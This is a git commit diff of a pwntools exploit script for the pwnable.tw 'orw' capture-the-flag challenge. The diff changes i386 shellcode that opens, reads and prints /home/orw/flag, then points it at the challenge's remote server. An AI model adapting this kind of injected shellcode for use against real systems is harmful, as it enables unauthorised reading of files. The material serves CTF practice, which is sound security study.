fb564bd8c2be9f0fe83b1ae788ae0b2e15de73bc
qrzbing <ikav.css@gmail.com>
2019-01-18 17:25:46 +0800

    update exp

--- pwnable.tw/100-orw/payload.py
+++ pwnable.tw/100-orw/payload.py
@@ -1,15 +1,15 @@
 from pwn import *
 
-p = process('./orw')
-
+# p = process('./orw')
+p = remote('chall.pwnable.tw', 10001)
 context(os = 'linux',arch='i386',log_level='debug')
 
 shellcode = ''
 shellcode += asm('''
-push 0x67616c66
-push 0x2f77726f
-push 0x2f656d6f
-push 0x682f2f2f
+push 0x00006761
+push 0x6c662f77
+push 0x726f2f65
+push 0x6d6f682f
 mov eax, 5
 mov ebx, esp
 xor ecx, ecx
@@ -18,11 +18,12 @@ int 0x80
 mov eax, 3
 mov ebx, 3
 mov ecx, esp
-mov edx, 0x20
+mov edx, 0x30
 int 0x80
-inc eax
+mov eax, 4
 mov ebx, 1
 int 0x80
 ''')
 
-print(shellcode)
+p.sendlineafter("shellcode:", shellcode)
+print(p.recv())
